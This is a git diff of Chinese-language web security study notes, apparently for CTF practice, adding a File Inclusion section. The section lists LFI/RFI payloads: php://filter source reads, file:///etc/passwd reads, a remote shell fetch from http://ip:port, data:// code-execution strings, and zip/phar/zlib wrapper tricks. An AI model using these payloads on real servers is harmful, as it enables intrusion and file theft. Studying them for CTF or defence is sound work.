@@ -28,7 +28,7 @@ Progress
 	- [x]  .user.ini
 	- [x]  Blacklist
 	- [x]  .htaccess
-- [ ]  File Inclusion
+- [x]  File Inclusion
 - [ ]  SSRF
 - [ ]  CSRF
 - [ ]  XSS
@@ -88,11 +88,7 @@ GBK注入的原因是因为GBK编码与addslashes()函数，\作为转义符来�
 # File Upload #
 
 ## Payload ##
-<<<<<<< HEAD
 
-## 总结 ##
-
-=======
 * JS限制: 禁用JS
 * %00截断: ?path=../upload/shell.php%00
 * 竞争上传: 
@@ -139,6 +135,71 @@ hp
 
 内容检测可以使用php代码的其他写法来进行Bypass
 
-.user.ini中的``auto_prepend_file``与``auto_append_file``分别对应在文件头包含目标文件与文件尾包含目标文件，，这里的包含与require，inquire等函数类似，且影响范围为.user.ini同目录下的php文件
+.user.ini中的``auto_prepend_file``与``auto_append_file``分别对应在文件头包含目标文件与文件尾包含目标文件，，这里的包含与require，include等函数类似，且影响范围为.user.ini同目录下的php文件
 
 .htaccess可以对Apache的解析规则进行修改，且优先级高于全局设置
+
+# File Inclusion #
+
+## Payload ##
+
+* LFI: 
+```
+#包含PHP代码
+?file=shell
+
+#读取PHP代码
+?file=php://filter/read=convert.base64-encode/resource=file_inclusion-1.php
+?file=php://filter/read=string.rot13/resource=file_inclusion-1.php
+
+#file协议读取文本文件
+?file=file:///etc/passwd
+```
+
+* 伪协议: 
+```
+?file=zip://shell.zip#shell
+```
+
+## 总结 ##
+
+对于正常的文件包含，包含的结果只与文件内容有关，与文件类型无关
+
+文件内容的其他文本会被正常显示，而PHP代码段则会被运行
+
+比较典型的例子就是上传PHP图片木马，再配合包含漏洞进行解析
+
+file协议可以读取本地文件系统中的文本文件
+```
+?file=file:///etc/passwd
+```
+
+http协议一般用于RFI，需要allow_url_fopen与allow_url_include都为on
+```
+?file=http://ip:port/dir/shell.txt
+```
+
+data协议需要allow_url_fopen与allow_url_include都为on，则可以使用data协议包含PHP代码来进行RCE
+```
+?file=data://text/plain,<?php phpinfo()?>
+?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
+```
+
+zip协议可以用于直接访问zip压缩包中的文件，可以bypass一些比较棘手的情况，如在文件包含的基础上添加了某些后缀
+```
+?file=zip://archive.zip#dir/file
+?file=zip://shell.zip#shell.txt
+```
+
+phar协议与zip协议较为类似，可以直接处理zip文件
+```
+?file=phar://archive.zip/dir/file
+?file=zip://shell.zip/shell.txt
+```
+
+zlib协议与zip相似，但是是用于处理gz压缩包，用于包含非gz文件时，则与正常包含一致
+```
+compress.zlib://shell.gz
+```
+
+php://input需要开启allow_url_include，可以将POST请求中的数据作为PHP代码来执行
